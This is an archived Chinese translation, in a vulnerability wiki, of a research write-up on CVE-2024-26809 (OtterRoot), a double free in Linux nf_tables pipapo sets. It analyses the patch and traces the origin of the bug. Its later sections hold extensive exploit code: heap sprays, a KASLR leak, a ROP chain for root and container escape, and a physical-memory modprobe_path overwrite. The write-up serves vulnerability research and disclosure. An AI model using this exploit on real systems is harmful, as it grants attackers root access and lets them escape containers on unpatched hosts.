---
source: "gelusus/wxvl 公众号漏洞文库"
cve: "CVE-2024-26809"
identifier_role: "primary"
primary_identifiers: "CVE-2024-26809"
referenced_identifiers: "CVE-2023-4004;CVE-2023-0461"
identifier_status: "unknown"
title: "OtterRoot Netfilter 通用型 Linux 本地提权 1-day 漏洞"
product: "Linux nf_tables pipapo"
record_type: "analysis"
document_type: "深度利用研究译文"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "本地nf_tables管理能力/命名空间前提需补；kernelCTF LTS固定ROP与amd64通用物理读写方案分别说明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/OtterRoot%20Netfilter%20%E9%80%9A%E7%94%A8%E5%9E%8B%20Linux%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%201-day%20%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-42f5996ffec12819c45889f9"
entity_id: "ve-42f5996ffec12819c45889f9"
schema_version: "1"
---

# OtterRoot Netfilter 通用型 Linux 本地提权 1-day 漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Linux nf_tables pipapo
- 文献类型：深度利用研究译文
- 版本、权限及部署边界：本地nf_tables管理能力/命名空间前提需补；kernelCTF LTS固定ROP与amd64通用物理读写方案分别说明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. frontmatter漏正文主CVE，标题OtterRoot别名需绑定26809；其他CVE是借鉴技术参考
2. 详细区分引入错误代码commit与后续变为可利用的commit，标准化不可粗暴压成一个introduced_at
3. 源码片段和13个来源/补丁/完整EXP链接丰富，保留kernelCTF与通用方案不同证据
4. 任何目标系统无需改动过强，正文结论实际所有测试目标且依赖amd64物理对齐、布局/配置，应补测试矩阵
5. 缺受影响/修复版本和USER_NS/CAP_NET_ADMIN配置；披露时间线月日缺年份，需锁2024而非当前
6. 可核对代码if(count=read(...)<0)优先级与原源码；普通长文应去断行但保留技术细节

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://google.github.io/security-research/kernelctf/rules.html>
- 原文参考链接（未重新核验）：<https://github.com/conlonialC>
- 原文参考链接（未重新核验）：<https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/>
- 原文参考链接（未重新核验）：<https://pwning.tech/nftables>
- 原文参考链接（未重新核验）：<https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation>
- 原文参考链接（未重新核验）：<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b0e256f3dd2ba6532f37c5c22e07cb07a36031ee>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

Pedro Pinto  securitainment   2024-12-21 05:37  
  
> OtterRoot Netfilter Universal Root 1-day  
  
  
在三月下旬，我尝试监控 Linux 内核子系统中容易出现可利用漏洞的热点区域的代码提交，这部分是为了研究通过补丁差异分析和循环利用一天漏洞来维持本地提权/容器逃逸能力的可行性，同时也是为了提交到  
KernelCTF VRP[1]  
。  
  
在研究过程中，我很快发现了 netfilter 中一个已修复的可利用漏洞，该漏洞被标记为 CVE-2024-26809（最初由  
lonial con[2]  
 发现）。我成功地在 KernelCTF LTS 实例中利用了这个漏洞，并编写了一个通用型漏洞利用程序，该程序可以在不同的内核版本中运行，无需重新编译不同的符号或 ROP 小工具。  
  
在这篇文章中，我将讨论如何通过快速利用补丁差异来开发一个一天漏洞利用程序，在补丁下发之前获得类似零日漏洞的本地提权/容器逃逸能力，这种能力持续了大约两个月。我还将分享我分析补丁以理解漏洞的过程，定位引入该漏洞的提交，在 KernelCTF VRP 中利用它，最后，我是如何开发一个通用型漏洞利用程序来针对主流发行版的。  
## 内核  
  
内核是操作系统的核心；它的目的不是作为一个普通应用程序，而是创建一个供应用程序运行的平台。内核直接与硬件交互，实现你能从操作系统中期望的所有功能，如用户隔离和权限、网络、文件系统访问、内存管理、任务调度等。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/82d18dac3cb60904d2c684a46b35beafab102c46892096bb152bcc852b01b8b2.png "")  
  
内核提供了一个接口，用户应用程序可以通过这个接口请求它们无法直接执行的操作（例如将某些内存映射到进程的虚拟地址空间、向进程暴露某些文件、打开网络套接字等）。这被称为系统调用接口，是用户空间向内核空间传递数据的主要方式。  
### 内核漏洞利用  
  
当内核处理用户应用程序传递的请求时，它和任何代码一样都会存在漏洞和安全问题，从逻辑问题到内存损坏都有可能，攻击者可以利用这些漏洞来劫持内核上下文中的执行流程或以其他方式提升权限。考虑到这一点，典型的内核漏洞利用通常包括以下步骤：  
- 在某个内核子系统中触发内存损坏  
  
- 利用它获得更强大的原语（控制流、任意读写等）  
  
- 使用当前原语来提升权限（通常是通过修改进程的凭证或类似效果的操作）  
  
我强烈建议阅读 Lkmidas 的内核漏洞利用入门  
博客文章[3]  
以更好地了解这个主题。  
## nf_tables  
  
nf_tables  
 是 Linux 内核 netfilter 子系统的一个组件。它是一个数据包过滤机制，是目前 iptables 和 Firewalld 等工具使用的后端。其内部结构已被其他研究人员详细讨论过  
1[4]  
,  
2[5]  
。我建议简要阅读这些文章以了解nf_table  
 对象的层次结构以及如何操作它们来创建可配置的过滤机制。  
  
为了本文的简洁性，我将省略任何与漏洞不直接相关的细节。  
### 事务  
  
事务是更新nf_tables  
 对象/状态的交互。它大致由一批修改nf_tables  
 对象的操作组成（添加/删除/编辑表、集合、元素、对象等）。它们大致由 3 个不同的阶段组成：  
- **控制平面**  
 准备每个操作，如果某些操作失败，则中止整个批处理；否则，提交整个批处理。  
  
- **提交路径**  
 在控制平面之后，如果全部成功，我们应用更改（实际修改表、集合等）。  
  
- **中止路径**  
 仅在控制平面检测到错误条件时触发；撤销控制平面期间完成的操作并跳过提交。  
  
## 漏洞详情  
  
接下来，让我们查看修复该漏洞的  
补丁[6]  
。  
```
diff --git a/net/netfilter/nft_set_pipapo.c b/net/netfilter/nft_set_pipapo.c
index c0ceea068936a6..df8de509024637 100644
--- a/net/netfilter/nft_set_pipapo.c
+++ b/net/netfilter/nft_set_pipapo.c
@@ -2329,8 +2329,6 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,

        m = rcu_dereference_protected(priv->match, true);

  if (m) {
   rcu_barrier();

-  nft_set_pipapo_match_destroy(ctx, set, m);
-
   for_each_possible_cpu(cpu)
    pipapo_free_scratch(m, cpu);
   free_percpu(m->scratch);
@@ -2342,8 +2340,7 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,
  if (priv->clone) {
   m = priv->clone;

-  if (priv->dirty)
-   nft_set_pipapo_match_destroy(ctx, set, m);
+  nft_set_pipapo_match_destroy(ctx, set, m);

   for_each_possible_cpu(cpu)
    pipapo_free_scratch(priv->clone, cpu);
```  
```
static void nft_set_pipapo_match_destroy(const struct nft_ctx *ctx,
      const struct nft_set *set,
      struct nft_pipapo_match *m)
{
 struct nft_pipapo_field *f;
 int i, r;

 for (i = 0, f = m->f; i < m->field_count - 1; i++, f++)
  ;

 for (r = 0; r < f->rules; r++) {
  struct nft_pipapo_elem *e;

  if (r < f->rules - 1 && f->mt[r + 1].e == f->mt[r].e)
   continue;

  e = f->mt[r].e;

  nf_tables_set_elem_destroy(ctx, set, &e->priv);
 }
}
```  
```
void nf_tables_set_elem_destroy(const struct nft_ctx *ctx,
    const struct nft_set *set,
    const struct nft_elem_priv *elem_priv)
{
 struct nft_set_ext *ext = nft_set_elem_ext(set, elem_priv);

 if (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))
  nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));

 kfree(elem_priv);
}
```  
### 根因分析  
  
对于已经提交的setelem  
 而言，由于它们具有重复的视图，因此对两个匹配对象都调用nf_tables_set_elem_destroy  
 会导致一个明显的双重释放漏洞。乍看之下，这段代码的实现非常奇怪。那么这个漏洞是如何产生的？为什么之前没有被发现？让我们深入分析一下。  
  
我们现在需要理解如何触发设置了priv->dirty  
 标志的代码路径。这个标志是 pipaposetelem  
 私有数据的一个成员，当在事务的控制平面传递期间对set  
 进行更改时，该标志会被设置为 true。这是为了告诉提交路径该set  
 有需要提交的更改。通过查看代码，我们可以发现通过插入新元素可以使set  
 变为 dirty 状态。  
```
static int nft_pipapo_insert(const struct net *net, const struct nft_set *set,
        const struct nft_set_elem *elem,
        struct nft_elem_priv **elem_priv)
{
[...]
 priv->dirty = true;
[...]
}
```  
```
static void nft_pipapo_commit(struct nft_set *set)
{
[...]
 if (!priv->dirty)
  return;
[...]
 priv->dirty = false;
[...]
}
```  
  
让我们再次查看代码，看看这些方法是如何被调用的。  
```
static int nf_tables_commit(struct net *net, struct sk_buff *skb)
{
[...]
  case NFT_MSG_DELSET:
  case NFT_MSG_DESTROYSET: // [1]
   nft_trans_set(trans)->dead = 1; // [2]
   list_del_rcu(&nft_trans_set(trans)->list);
   nf_tables_set_notify(&trans->ctx, nft_trans_set(trans),
          trans->msg_type, GFP_KERNEL);
   break;
  case NFT_MSG_NEWSETELEM: // [3]
[...]
   if (te->set->ops->commit &&
       list_empty(&te->set->pending_update)) {
    list_add_tail(&te->set->pending_update,
           &set_update_list);
   }
[...]
 }

 nft_set_commit_update(&set_update_list);
[...]
 nf_tables_commit_release(net);

 return 0;
}
```  
```
static void nft_set_commit_update(struct list_head *set_update_list)
{
 struct nft_set *set, *next;

 list_for_each_entry_safe(set, next, set_update_list, pending_update) {
  list_del_init(&set->pending_update);

  if (!set->ops->commit || set->dead) // [4]
   continue;

  set->ops->commit(set); // [5]
 }
}
```  
```
static void nf_tables_commit_release(struct net *net)
{
[...]
 schedule_work(&trans_destroy_work);
[...]
}
[...]
static void nf_tables_trans_destroy_work(struct work_struct *w)
{
[...]
 list_for_each_entry_safe(trans, next, &head, list) {
  nft_trans_list_del(trans);
  nft_commit_release(trans);
 }
}
[...]
static void nft_commit_release(struct nft_trans *trans)
{
 switch (trans->msg_type) {
[...]
 case NFT_MSG_DELSET:
 case NFT_MSG_DESTROYSET:
  nft_set_destroy(&trans->ctx, nft_trans_set(trans));
[...]
}
[...]
static void nft_set_destroy(const struct nft_ctx *ctx, struct nft_set *set)
{
[...]
 set->ops->destroy(ctx, set);
[...]
}
```  
## 追踪有问题的提交  
  
上述场景引发了一些关于这个漏洞是如何被引入的有趣推测。任何关于这个漏洞的  
安全公告[7]  
都会说它是由这个  
提交[8]  
引入的，这听起来很合理，因为这个提交添加了在同一路径中释放两次的奇怪代码。然而，通过检查set->dead  
标志的代码归属，我们会发现这个真正使漏洞可被利用的标志是在上述提交一年多后才由这个  
提交[9]  
引入的。  
  
通过阅读第一个提交的信息，我们终于可以理解为什么要添加这段代码：  
```
New elements that reside in the clone are not released in case that the
transaction is aborted.

[16302.231754] ------------[ cut here ]------------
[16302.231756] WARNING: CPU: 0 PID: 100509 at net/netfilter/nf_tables_api.c:1864 nf_tables_chain_destroy+0x26/0x127 [nf_tables]
[...]
[16302.231882] CPU: 0 PID: 100509 Comm: nft Tainted: G        W         5.19.0-rc3+ #155
[...]
[16302.231887] RIP: 0010:nf_tables_chain_destroy+0x26/0x127 [nf_tables]
[16302.231899] Code: f3 fe ff ff 41 55 41 54 55 53 48 8b 6f 10 48 89 fb 48 c7 c7 82 96 d9 a0 8b 55 50 48 8b 75 58 e8 de f5 92 e0 83 7d 50 00 74 09 <0f> 0b 5b 5d 41 5c 41 5d c3 4c 8b 65 00 48 8b 7d 08 49 39 fc 74 05
[...]
[16302.231917] Call Trace:
[16302.231919]  <TASK>
[16302.231921]  __nf_tables_abort.cold+0x23/0x28 [nf_tables]
[16302.231934]  nf_tables_abort+0x30/0x50 [nf_tables]
[16302.231946]  nfnetlink_rcv_batch+0x41a/0x840 [nfnetlink]
[16302.231952]  ? __nla_validate_parse+0x48/0x190
[16302.231959]  nfnetlink_rcv+0x110/0x129 [nfnetlink]
[16302.231963]  netlink_unicast+0x211/0x340
[16302.231969]  netlink_sendmsg+0x21e/0x460

Add nft_set_pipapo_match_destroy() helper function to release the
elements in the lookup tables.

Stefano Brivio says: "We additionally look for elements pointers in the
cloned matching data if priv->dirty is set, because that means that
cloned data might point to additional elements we did not commit to the
working copy yet (such as the abort path case, but perhaps not limited
to it)."

Fixes: 3c4287f62044 ("nf_tables: Add set type for arbitrary concatenation of ranges")
Reviewed-by: Stefano Brivio <sbrivio@redhat.com>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
```  
  
这种情况在提交路径中并不合理，只在中止路径中有意义。显然，当中止创建set  
 的事务时，不会有任何已提交的更改，只有克隆集中的元素最终不会被提交。因此，为了确保释放这些未提交的元素，释放克隆中的内容至关重要。  
  
当引入这段代码时，它只能从中止路径到达，因为这是唯一一条在不清除priv->dirty  
 标志的情况下可以调用set->ops->destroy()  
 的路径。考虑到当时没有重复的setelem  
 视图，所有元素都在克隆集中，这种设计是合理的。  
  
但是当引入set->dead  
 标志时，一些关于提交路径的假设发生了改变。它创造了一种新的方式来访问这段代码，同时已经在集合中提交了更改。这意味着任何已提交的更改都会在"普通"匹配对象和克隆中各有一个视图。  
  
这个漏洞最终通过仅从克隆中删除元素得到修复，因为克隆应该包含已提交和未提交更改的所有视图，从而有效地消除了双重释放漏洞。  
## KernelCTF 漏洞利用  
  
现在我们已经了解了这个漏洞的完整故事，让我们来看看在深入研究通用漏洞利用之前，我是如何在 KernelCTF LTS 实例中利用它的。漏洞利用的很大一部分是基于 lonial con 在  
之前的 kernelCTF 漏洞利用[10]  
中分享的nft_object + udata  
 技术。  
### 触发 UAF/避免双重释放检测  
  
SLUB 分配器有一个简单的双重释放检测机制，用于发现直接的序列，比如同一个对象在没有其他对象添加到空闲列表的情况下被连续添加两次。正如我们所见，nft_set_pipapo_match_destroy  
 会遍历集合中的setelems  
 并释放每一个，所以通过在集合中放置多个元素来避免检测应该相对简单，这种情况下会发生以下情况：  
1. 元素 A 被释放  
  
1. 元素 B 被释放  
  
1. 元素 A 再次被释放（双重释放）  
  
1. 元素 B 再次被释放（双重释放）  
  
```
[...]
static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
[...]
    // TRANSACTION 2
[...]

    // create pipapo set
    uint8_t desc[2] = {16, 16};
    set = create_set(
        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);

    // commit 2 elems to set (elems A and B that will be double-freed)
    for (int i = 0; i < 2; i++)
    {
        elem[i] = nftnl_set_elem_alloc();
        memset(key, 0x41 + i, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
        nftnl_set_elem_add(set, elem[i]);
    }
[...]

    // TRANSACTION 3
[...]
    set = nftnl_set_alloc();
    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, exploit_table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, "pwn_set");

    // make priv->dirty true
    memset(key, 0xff, KEY_LEN);
    elem[3] = nftnl_set_elem_alloc();
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
    nftnl_set_elem_add(set, elem[3]);
[...]

    // double-free commited elems
[...]
    nftnl_set_free(set);
}
[...]
```  
  
表中包含一个可读写的外部用户数据缓冲区udata  
。通过在双重释放的槽位上分配一个udata  
 缓冲区，并使其与nft_object  
 重叠，我们可以泄露->ops  
 指针，并利用它来计算 KASLR 偏移量。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/b5b98658b5bf1528955e3d8d2044b6c62995fa80be2fcaae075b8d0d0e854e26.png "")  
  
```
[...]
    // spray 3 udata buffers to consume elems A, B and A again
    udata_spray(nl, 0xe8, 0, 3, NULL);

    // check if overlap happened (i.e if we have to overlapping udata buffers)
    char spray_name[16];
    char *udata[3];
    for (int i = 0; i < 3; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        udata[i] = getudata(nl, spray_name);
    }
    if (udata[0][0] == udata[2][0])
    {
        puts("[+] got duplicated table");
    }

    // Replace one of the udata buffers with nft_object
    // and read it's counterpart to leak the nft_object struct
    puts("[*] Info leak");
    deludata_spray(nl, 0, 1);
    wait_destroyer();
    obj_spray(nl, 0, 1, NULL, 0);
    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");
[...]
```  
  
正如我将在 ROP 部分详细讨论的那样，漏洞利用需要一个已知的可控内存地址才能工作。我决定使用nft_object  
 来获取它自己的地址。这是可行的，因为nft_object  
 有一个udata  
 指针（类似于我用来泄露 KASLR 的table->udata  
），我可以用它来读写数据。  
  
nft_object  
 结构体还包含一个list_head  
，它被插入到一个循环链表中，该链表包含属于给定table  
 的所有nft_object  
。考虑到我们的对象目前在其表中是独立的，nft_object  
 中的table->list.next  
 指针将指回包含在table  
 中的list_head  
，反之亦然。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/1e0857a456d0d86bd6f5d4b1c7f834e45cad4d6619f9e0cafe84c3903bc310ea.png "")  
  
简而言之，这意味着如果我们将nft_object  
 的udata  
 指针与它自己的list.next  
 指针交换，我们应该能够读取一个指向nft_object  
 的list_head  
 的指针，这也是nft_object  
 本身的起始位置。**注意：**  
 这是一个新颖的小技巧。  
```
[...]
    // Leak nft_object ptr using table linked list
    fake_obj[8] = 8;           // ulen = 8
    fake_obj[9] = fake_obj[0]; // udata = list->next
    deludata_spray(nl, 2, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 3, 1, fake_obj);

    get_obj(nl, "spray-0", true);
    printf("[*] nft_object ptr: 0x%lx\n", obj_ptr);
[...]
```  
  
为了劫持控制流，我们可以再次使用nft_object  
。nft_object  
 结构体有一个指向函数指针表的ops  
 指针。我们可以将ops  
 指针与udata  
 指针交换，从而控制指针表。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/dd90c3b35c6dd14b00539be8ae548bf328140ae57ace52c9916f73e9b4c0df71.png "")  
```
[...]
    // Fake ops
    uint64_t *rop = calloc(29, sizeof(uint64_t));
    rop[0] = kaslr_slide + 0xffffffff81988647; // push rsi; jmp qword ptr [rsi + 0x39];
    rop[2] = kaslr_slide + NFT_CT_EXPECT_OBJ_TYPE;
[...]
    // Send ROP in object udata
    del_obj(nl, "spray-0");
    wait_destroyer();
    obj_spray(nl, 1, 1, rop, 0xb8);
    fake_obj = (uint64_t *)getudata(nl, "spray-3");
    DumpHex(fake_obj, 0xe8);
    uint64_t rop_addr = fake_obj[9]; // udata ptr
    printf("[*] ROP addr: 0x%lx\n", rop_addr);

    // Point to fake ops
    fake_obj[16] = rop_addr - 0x20; // Point ops to fake ptr table
[...]
    // Write ROP
    puts("[*] Write ROP");
    deludata_spray(nl, 3, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 4, 1, fake_obj);

    // Takeover RIP
    puts("[*] Takeover RIP");
    dump_obj(nl, "spray-1");
[...]
```  
  
nft_object  
 的操作是在 RCU 临界区中调用的，这对于 ROP 利用来说可能会产生问题，因为我们想要在执行完 payload 后切换到用户空间上下文，而这在 RCU 临界区中是不允许的。  
  
D3v17 在  
之前的 kernelCTF 提交[11]  
中讨论过一种解决方案，主要是使用内存写入小工具在切换到用户空间之前覆盖我们task_struct  
 中的 RCU 锁。虽然这种方法可行，但我在寻找有用的小工具时遇到了困难，最终想出了一个更简单的解决方案。内核 API 中专门有用于获取/释放 RCU 锁的函数，因此我们应该可以在切换上下文之前简单地调用__rcu_read_unlock()  
 函数并退出 RCU 临界区。  
```
    // ROP stage 1
    int pos = 3;

    rop[pos++] = kaslr_slide + __RCU_READ_UNLOCK;
```  
  
用于容器逃逸并获取 root 权限的大部分 ROP 链都是常规操作：  
- commit_creds(&init_cred);  
 为我们的进程提交 root 权限凭证  
  
- task = find_task_by_vpid(1);  
 查找我们命名空间中的 root 进程  
  
- switch_task_namespaces(task, &init_nsproxy);  
 将其移动到 root 命名空间  
  
然而，我在寻找能够轻松地将find_task_by_vpid(1)  
 通过rax  
 传递的返回值移动到rdi  
 的小工具时遇到了困难。最终我采用了一个push rax; jmp qword ptr [rsi + 0x66]; ret  
 小工具，它允许我将rax  
 值压入栈中，然后跳转到一个受控位置，在那里我存储了一个pop rdi; ret  
 小工具来消费新的栈值并恢复正常的 ROP 执行。这个 ROP 流程中的微小绕道如下所示：  
- 我们将值压入栈中（栈指针回退）  
  
- 我们跳转到我们的"跳板"小工具（pop rdi; ret;  
 位置）  
  
- pop rdi; ret  
 从栈中消费该值（将栈指针推进回应有的位置），然后我们跳回到下一个小工具  
  
```
[...]
    // commit_creds(&init_cred);
    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
    rop[pos++] = kaslr_slide + INIT_CRED;
    rop[pos++] = kaslr_slide + COMMIT_CREDS;

    // task = find_task_by_vpid(1);
    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
    rop[pos++] = 1;
    rop[pos++] = kaslr_slide + FIND_TASK_BY_VPID;
    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
    rop[pos++] = obj_ptr + 0xe0 - 0x66;            // rax -> rdi and resume rop
    rop[pos++] = kaslr_slide + 0xffffffff81caed31; // push rax; jmp qword ptr [rsi + 0x66];

    // switch_task_namespaces(task, &init_nsproxy);
    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
    rop[pos++] = kaslr_slide + INIT_NSPROXY;
    rop[pos++] = kaslr_slide + SWITCH_TASK_NAMESPACES;
[...]
```  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ac24972025b0542a4f74fb768282f9416518bac4faa1c522d3dc20d97096d738.png "")  
  
你可以在我们的  
GitHub[12]  
 上找到 kernelCTF 的漏洞利用代码。  
## 通用型漏洞利用  
  
在成功利用 KernelCTF 之后，我决定利用这个漏洞开发一个通用型漏洞利用程序（一个无需修改就能在任何目标系统上稳定运行的程序）。我采用了一种不同的方法来避免一些兼容性和可靠性问题，其中最大的问题是 ROP 和其他依赖内核数据偏移的技术，因为这些偏移在不同的构建版本之间会发生变化。虽然为不同的构建版本编译一个小工具列表并不罕见，但完全避免这些麻烦显然更有意义。  
### 使用 msg_msg->mlist.next 指针进行转移  
  
利用双重释放漏洞，我们可以让msg_msg  
 对象与udata  
 重叠，从而控制m_list.next  
 指针。  
```
/* one msg_msg structure for each message */
struct msg_msg {
 struct list_head m_list;
 long m_type;
 size_t m_ts;  /* message text size */
 struct msg_msgseg *next;
 void *security;
 /* the actual message follows immediately */
};
[...]
struct list_head {
 struct list_head *next, *prev;
};
```  
  
通过将我们可控的msg_msg  
 的 next 指针增加 256，我们可以使其指向已被其他主消息引用的不同次级消息，从而创建重复引用。这为我们提供了一种简单的方法来将双重释放能力扩展到其他缓存，并攻击更多种类的对象。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/56548c329adfd27134264fa9cae9172b1519fafcb78663bb6a632443a67644a6.png "")  
```
[...]
    // Spray msg_msg in kmalloc-256 and kmalloc-1k
    msg_t *msg = calloc(1, sizeof(msg_t) + 0xe8 - 48);
    int qid[SPRAY];
    for (int i = 0; i < SPRAY; i++)
    {
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid[i] < 0)
        {
            perror("[-] msgget");
        }
        *(uint32_t *)msg->mtext = i;
        *(uint64_t *)&msg->mtext[8] = 0xdeadbeefcafebabe;
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 0xe8 - 48, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024 - 48, 0);
    }
    // Prepare evil msg
    int evilqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (evilqid < 0)
    {
        perror("[-] msgget");
    }
[...] // trigger double-free in kmalloc-256
```  
  
现在我们已经扩大了双重释放漏洞的影响范围，接下来最好转向kmalloc-1k  
 并让pipe_buffer  
 与skbuf  
 数据重叠，以控制page  
 字段。  
  
page  
 字段是指向vmemmap_base  
 的指针，其中包含了所有用于跟踪映射到内核的内存页面的结构体。在读写管道时，这个指针用于获取与给定管道相关联的数据地址。  
  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c12970accda6f9989b79d38558e398fc9e9b5ae389908330ec48b909c8b8fb4c.png "")  
  
这样我们就可以遍历vmemmap_base  
 数组，并使用我们的管道作为接口直接读写内核内存。  
### 暴力破解物理内核基址  
  
有了遍历内核内存页面并进行读写的能力，我们可以轻松地寻找任何想要覆盖的值，比如modprobe_path  
。需要注意的是，从vmemmap_base  
 开始逐页搜索会非常耗时，因为内核基址加载的物理地址是随机化的。不过，内核基址的起始位置总是按照一个常量PHYSICAL_ALIGN  
 值对齐的，在 amd64 上默认是 0x200000，所以我们可以通过首先只查看对齐的地址来寻找类似内核基址的内容，然后从那里开始逐页搜索，这样可以显著加快搜索速度。  
```
[...]
// Bruteforce phys-KASLR
    uint64_t kernel_base;
    bool found = false;
    uint8_t data[PAGE_SIZE] = {0};
    puts("[*] bruteforce phys-KASLR");
    for (uint64_t i = 0;; i++)
    {
        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
        pipebuf->page = vmemmap_base + kernel_base;
        pipebuf->offset = 0;
        pipebuf->len = PAGE_SIZE + 1;
[...]
        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }
[...]

            if (is_kernel_base(data)) // [1] identify kernel base
            {
                found = true;
                break;
            }
        }

[...]
```  
```
[...]
static bool is_kernel_base(unsigned char *addr)
{
    // thanks lau :)

    // get-sig kernel_runtime_1
    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
        return true;

    // get-sig kernel_runtime_2
    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
        return true;

    return false;
}
[...]
```  
  
在内核内存中定位/sbin/modprobe  
 字符串并将其替换为指向我们所拥有文件的可控值变得相对简单。  
  
虽然我们在 chroot 环境中运行且无法在根文件系统创建文件，但有一个广为人知的技巧可以解决这个问题 - 通过`/proc/<pid>/fd/<n>`  
 路径暴露 memfd。值得注意的是，由于我们无法获知非特权命名空间外的进程 ID，因此需要采用暴力枚举的方式。  
```
[...]
    puts("[*] overwrite modprobe_path");
    for (int i = 0; i < 4194304; i++)
    {
        pipebuf->page = modprobe_page;
        pipebuf->offset = modprobe_off;
        pipebuf->len = 0;
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                perror("[-] write(socket)");
                break;
            }
        }

        memset(&data, 0, PAGE_SIZE);
        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);

        lseek(modprobe_fd, 0, SEEK_SET);
        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);

        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
        {
            perror("\n[-] write(pipe)");
        }

        if (check_modprobe(fd_path))
        {
            puts("[-] failed to overwrite modprobe");
            break;
        }

        if (trigger_modprobe(status_fd))
        {
            puts("\n[+] got root");
            goto out;
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
